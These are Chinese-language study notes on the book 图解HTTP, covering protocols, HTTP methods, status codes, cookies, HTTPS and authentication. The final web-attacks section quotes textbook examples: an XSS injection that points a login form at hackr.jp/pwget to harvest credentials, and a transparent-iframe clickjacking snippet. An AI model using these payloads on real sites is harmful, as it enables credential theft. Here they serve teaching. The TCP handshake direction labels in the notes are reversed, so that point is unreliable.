# 图解HTTP

## 1- Web Base

### 三项WWW技术

- 把SGML作为HTML
  - “Markup language” 是用标准的标记来解释纯文本文档的内容，从而提供关于文档结构或文档该如何渲染的信息
  - HTML5 ≈ HTML + CSS3 + JavaScript + 浏览器API 一种标准
  - SGML，HTML，XML关系：
    - SGML是一种meta-language
    - HTML是SGML的一种实现
    - XML是SGML的子集，同样是meta-language
- 为文档传递协议的 HTTP
- 指定文档所在地址的 URL Uniform Resource Locator

### TCP/IP 分层管理

应用层（买卖东西）

- 向用户提供通信服务
- FTP HTTP DNS

传输层（搭路）

- 实现 connect功能
-  TCP UDP

网络层（运输）

- 如何具体传输数据包
- IP协议

链路层（操作物理层面）

- OS 网卡

为了传输方便，在传输层（TCP 协议）把从应用层处收到的 数据（HTTP 请求报文）进行分割，并在各个报文上打上标记序号及端 口号后转发给网络层。

在网络层（IP 协议）， 增加作为通信目的地的 MAC 地址后转发给 链路层。

### IP TCP DNS protocol

- IP协议
  - ip地址与mac地址（网卡所属的固定地址）
  - ip间的传输依赖MAC地址，用ARP将IP地址转化为MAC地址
- TCP协议
  - TCP 协议为了更容易传送大数据才把数据分割， 而且 TCP 协议能够确 认数据最终是否送达到对方。
  - 三次握手
    - syn s2c
    - syn/ack c2s
    - ack s2c
  - 四次挥手
- DNS
  - 将domain -> ip
  - ip -> domain

### URI(uniform resource identifier)

- 对资源的唯一标识（URL即网址，URI的一个子集）
- Https://user:pass@www.example.com:80/dir/index.htm?uid=1#ch1

### Request For Comments

## 2-HTTP协议

### 概念

1. client发送request message，server发送response message，从而达成通信

   1. <img src="https://raw.githubusercontent.com/eudemoniac/image/main/img/image-20220409143705446.png" alt="image-20220409143705446" style="zoom:67%;" />

      <img src="https://raw.githubusercontent.com/eudemoniac/image/main/img/image-20220409143749918.png" alt="image-20220409143749918" style="zoom:67%;" />

2. HTTP协议不保存状态：server不知道client上次发送了什么。但通过cookie技术可以实现状态管理

### 请求URI

在请求资源时，我们用URI来定位所需的资源。而请求报文中，URI有三种表示方式

1. 绝对URI：例如 GET http://hackr.jp/index.htm HTTP/1.1

2. 相对URI：在Host中补充访问的域名。

   ​	GET /index.htm HTTP/1.1 
   ​	Host: hackr.jp

3. 请求并不是以访问资源为目的（比如是查询服务器状态），则用*来代替

   ​	OPTIONS * HTTP/1.1

### HTTP方法

- GET：获取资源
- POST：传输实体的主体
- PUT：传输文件（由于不自带验证机制，通常只在配合Web应用的验证机制，或遵循REST标准的网页使用）
- HEAD：获得response message的首部（不想获得该资源，只是想看看该资源是否存在）
- DELETE：删除文件（备注同PUT）
- OPTION：查询请求URI支持的方法
- TRACE：追踪路径（提供一个MAX-Forward参数，每经过一个中转服务器就减一，当为0时，便停止传输）
- CONNECT：要求使用隧道协议链接代理（将信息经SSL，TLS加密后经隧道传输）

### 提高通信效率

持久化(persistent connection)

- 原始HTTP协议：每一轮request，response后就断开
- 持久连接：只要任意一端没提出断开，就一致处于连接状态

管线化(Pipelining)

- 原始：request和response交替进行，导致下一轮request必须等待上一轮的response完成才能开始
- 管线化：不等待response，直接发送下一个请求

### Cookie

步骤

- client发送request
- server生成cookie，在response中添加cookie
- client在request中添加 cookie
- server通过cookie辨认client

表现

生成cookie：＜Set-Cookie: sid=1342077140226724; path=/; expires=Wed,=>10-Oct-12 07:12:20 GMT＞

传输cookie：Cookie: sid=1342077140226724

## 3-Information in Message

<img src="https://raw.githubusercontent.com/eudemoniac/image/main/img/image-20220411165910995.png" alt="image-20220411165910995" style="zoom:50%;" />

### chunked transfer coding : 将实体分成多个小块传输

### 请求部分：Range : 501-1000

Negotiation : server与client(browser)就内容的呈现形式进行协商（语言，移动端，桌面端）

## 4-HTTP status code

告知client，server目前的处理情况

a-bb：a通常区分了主类别

- 类别
  1. 正在处理
  2. 成功
  3. 重定向
  4. 客户端的错
  5. 服务器的错
- 具体
  - 2
    - 200 OK
    - 204 No Content：正确处理请求，但没东西返回：比如client上传文件时
    - 206 partial content : request range 
  - 3:浏览器需要执行一些操作从而正确处理请求
    - 301 moved permanently : 资源已被分贝给了新的URI
    - 302 not found：资源可能被临时移动
    - 303 see other：同302，但明确指出应该用get获取该资源（你可能使用了post）（事实上收到301，302，303后，浏览器都会改为get，但在标准中前两个code不用改）
    - 304 not modified：满足你条件的资源找不到（eg特定时间上传的）
    - 307 temporary redirect:同302
  - 4:client fault
    - 400 bad request：request 语法错误， 浏览器则会视为200
    - 401 unauthorized :需要有HTTP认证，第一次收到会弹出认证的对话窗口，第二次弹出则表示认证失败
    - 403 forbidden：request被 server拒绝了，理由可有可没有
    - 404 not found：资源找不到，或者情况同403
  - 5：server fault
    - 500 internal server error：server执行请求出了bug
    - 503 service unavailable：server 超负荷或维修
- 有时返回的code是错误的

## 5-Web服务器

### virtual host

一台服务器可以通过虚拟机模拟成多台服务器

同一台服务器上部署网站的IP地址是相同的，所以必须要完整的指出URI

### proxy gate tunnel

- proxy：扮演中间人，每次转发都会写入via proxy1信息
  - 是否使用缓存：保存副本
  - 是否会修改报文：不对报文做任何加工的称为transparent proxy
- Gate：切换连接协议（client-http-gate-nonhttp-server），提高安全
- tunnel：隧道本身是透明的，可以实现SSL

cache：server and client(不用联网了，浏览器直接从cache里面找)

ftp是种远古协议

## 6-HTTP header

- what
  - 涵盖一些用于通信的重要信息

- consist
  - request message
    - request line
    - request header
    - general header
    - entity header
    - CR LF
    - entity
  - header：
  - 首部字段名：字段值a，字段值b

若字段名重复了，具体策略看浏览器选择

- Genre
  - end to end：必须一直穿到终点server
  - hop by hop：只转发一次：若碰到缓存、代理可能不再转发

## 7-https

***<u>HTTP+ 加密 + 认证 + 完整性保护 =HTTPS</u>***

- 原理

  - client用公钥上锁，server用私钥解密。公私钥都由server提供

  - 如何确认公钥：由中立的CA加密生成证书，server将证书发给client，client通过CA自己的公钥（通常由浏览器下载，保存）来解密，确认证书以及server的真实性。

  - 在确认公钥后，client将message用公钥加密，server用私钥解密

- Openssl：自我声明，通常没什么作用

- SSL慢：通信变慢，资源消耗导致处理变慢：采用ssl加速器

都由server提供

<img src="https://raw.githubusercontent.com/eudemoniac/image/main/img/image-20220411160243619.png" alt="image-20220411160243619" style="zoom:50%;" />

## 8-确认用户身份

### Basic

直接明文上传密码+用户名

### Digest

server 返回一个nonce，client需要把密码和nonce做运算，生成response返回，作为一种认证

### SSH

用户需要上传自己的证书（证明是这台机器）+表单认证（证明是本人）

### 表单认证（主流）

非HTTP协议，而是client向Web App发送credential（用户名+密码）

### session and cookie

server靠cookie中的ssid辨识正在进行session的client（所以如果泄露ssid的话就很危险）

### server保存密码

hash（密码+salt（长数））

## 9-HTTP追加协议

### SPDY

http's bottleneck

- 一次连接只能发送一条请求
- server无法给client发送请求
- 首部冗长
- 数据压缩非强制
- 网页编写有问题

Ajax （asynchronous javasrcipt and Xml）

- 使用了xmlhttprequest 的api，可以实现从已加载的网页发送请求，只更新局部页面

comet

- serverpush：server会搁置请求，直到有更新，再一并返回给cilent

SPDY：

- 在osi模型的会话层，处于http和ssl之间
- 实现功能
  - 多路复用：一条tcp连接处理多个请求
  - 赋予请求优先级
  - 压缩header
  - server push
  - 服务器提示

### websocket

用http建立连接，一旦确立websocket，任意一方都可以发起message

- server push
- 减少通信量（一直保持在连接状态）

<img src="https://raw.githubusercontent.com/eudemoniac/image/main/img/image-20220412154105122.png" alt="image-20220412154105122" style="zoom:50%;" />

- websocket api

### HTTP 2.0

- SPDY
- speed + mobility
- network friendly http upgrade

<img src="https://raw.githubusercontent.com/eudemoniac/image/main/img/image-20220412154314979.png" alt="image-20220412154314979" style="zoom:50%;" />

### webdav

直接对web文件复制、管理、加锁

防火墙的基本功能就是禁止非指定的协议和端口号的数据包通过。因此如 果使用新协议或端口号则必须修改防火墙设置。

## 构成web的技术

### CSS 

CSS 的理念就是让文档的结构和设计分离，达到解耦的目的。

### 动态HTML

Javascript

DOM：为js提供接口，可以操作HTML的元素

```javascript
<body>

　　　　　<h1>繁琐的Web安全</h1>

　　　　　<p>第Ⅰ部分　Web的构成元素</p>

　　　　　<p>第Ⅱ部分　浏览器的安全功能</p>

　　　　　<p>第Ⅲ部分　接下来发生的事</p>

</body>

<script type="text/javascript">
var content = document.getElementsByTagName('P');
content[2].style.color = '#FF0000';
</script>
```

### Web App

这种由程序创建的内容称为动态内容，而事先准备好的内容称 为静态内容。Web 应用则作用于动态内容之上。

CGI

- 是指 Web 服务器在接收到客户端发送过来的请求后转发给程序的一组机制。 程序会对请求内容做出相应的动作， 比如创建 HTML 等动态 内容。

Servlet(server applet)

- Servlet 是一种能在服务器上创建动态内容的程序。
- Servlet 作为解决 CGI 问题的对抗技术，随 Java 一起得到了普及。
- 随着 CGI 的普及，每次请求都要启动新 CGI 程序的 CGI 运行机制 逐渐变成了性能瓶颈，所以之后 Servlet 和 mod_perl 等可直接在 Web 服 务器上运行的程序才得以开发、普及。

### XML

与 HTML 相比，它对数据的记录方式做 了特殊处理。

在XML中，是严格的树状结构，绝对不能省略掉结束标记。从 XML 文档中读取数据比起 HTML 更为简单。由于 XML 的结构 基本上都是用标签分割而成的树形结构，因此通过语法分析器（Parser） 的解析功能解析 XML 结构并取出数据元素， 可更容易地对数据进行 读取。

html是用来显示数据的；xml是用来描述数据、存放数据的——因为句法更严格？

### JSON

javascript object notation

## 11-Web攻击

### http的问题

- 无法对session进行管理、加密
- SSH本身提供了相关服务

### 攻击模式

- 主动攻击：sql、os注入攻击（直接攻击server）
- 被动攻击：木马脚本、网址等（获取client信息）被动攻击模式中具有代表性的攻击是跨站脚本攻击和跨站 点请求伪造。

### 细说攻击

- 跨站脚本攻击

  - 虚假表单骗取用户信息

  - ```javascript
    <div class="input_id">
    
    ID <input type="text" name="ID" value=" "><script>var f=document ⇒
    
    .getElementById("login"); f.action="http://hackr.jp/pwget"; f.method= ⇒
    
    "get";</script><span s=" " />
    
    </div>
    ```

    

  - 窃取cookie

  - 显示伪造的页面

- 注入攻击
  - sql
  - os（sh）
  - http header
    - 设置任意cookie
    - redirect
    - 任意显示
- 目录遍历攻击、强制浏览
  - generate /yxb_secret_1.png while she doesn't wanna show this pic

- 错误抛出导致信息泄露
  - 此邮箱已注册
  - 直接暴露数据库schema

- session hijack

  - xss攻击：通过js脚本窃取cookie中的sid
  - 固定攻击：将client的sid偷换成自己的sid，从而可以通过监听自己的sid来看到client的操作

- UI redressing

  - 透明层

  - ```javascript
    <iframe id="target" src="http://sns.example.jp/leave" style= ⇒
    
    "opacity:0;filter:alpha(opacity=0)"></iframe>
    
    <button style="position:absolute;top:100;left:100;z-index:-1">PLAY ⇒
    
    </button>
    ```

    

- Denial of Service 
  - 集中访问导致overload（发送大量的合法请求，使得server真假难辨
  - 攻击安全漏洞
  - Distributed Dos
- Backdoor
